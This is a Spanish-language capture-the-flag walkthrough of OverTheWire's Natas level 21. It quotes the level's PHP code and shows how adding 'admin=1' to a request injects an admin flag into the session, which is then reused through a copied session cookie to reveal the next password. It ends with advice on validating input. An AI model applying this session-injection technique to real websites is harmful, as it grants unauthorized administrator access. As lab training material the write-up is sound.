En este nivel, contamos con dos páginas. La página principal nos informa que estamos registrados como un usuario regular y nos indica que debemos registrarnos como administradores para obtener la contraseña del siguiente nivel. El código de esta página verifica si nuestra sesión contiene el valor `admin = 1` y, de ser así, muestra la contraseña del nivel siguiente.
```php
<?php

function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas22\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
    }
}
/* }}} */

session_start();
print_credentials();

?>
```

La página _CSS Experimenter_ nos presenta un formulario que permite modificar los valores de estilo de una sección. Al revisar su código, observamos que estos valores se almacenan en la sesión, lo que permite que se conserven nuestros cambios incluso después de recargar la página.

```php
<?php

session_start();

// if update was submitted, store it
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}

if(array_key_exists("debug", $_GET)) {
    print "[DEBUG] Session contents:<br>";
    print_r($_SESSION);
}
```

Si agregamos el campo `debug` en nuestra [solicitud](http://natas21-experimenter.natas.labs.overthewire.org/index.php?debug=true) podemos ver el contenido de la sesión:
```
[DEBUG] Session contents:  
Array ( [align] => bottom [fontsize] => 200% [bgcolor] => blue [submit] => Update )
```

Al recibir el valor `submit`, el código almacena todos los valores enviados a través de la solicitud, por lo que podemos agregar el campo `admin = 1` para que se guarde dentro de la sesión. 
```
https://natas21-experimenter.natas.labs.overthewire.org/index.php?debug=true&admin=1&submit
```

Ahora en la pestaña `Aplicación > Cookies`, podemos copiar el ID de la sesión y llevarlo a la pagina principal. Una vez reemplacemos la *cookie* y recarguemos la página, podremos ver la contraseña del próximo nivel.

---
## **Conclusión**
 
La función encargada de almacenar valores en la sesión es vulnerable debido a la falta de validación de los campos recibidos en la solicitud. Para evitar este tipo de ataques, es necesario validar y filtrar los datos antes de almacenarlos, además  de evitar las dependencias entre páginas.

---
-,"  
[_P
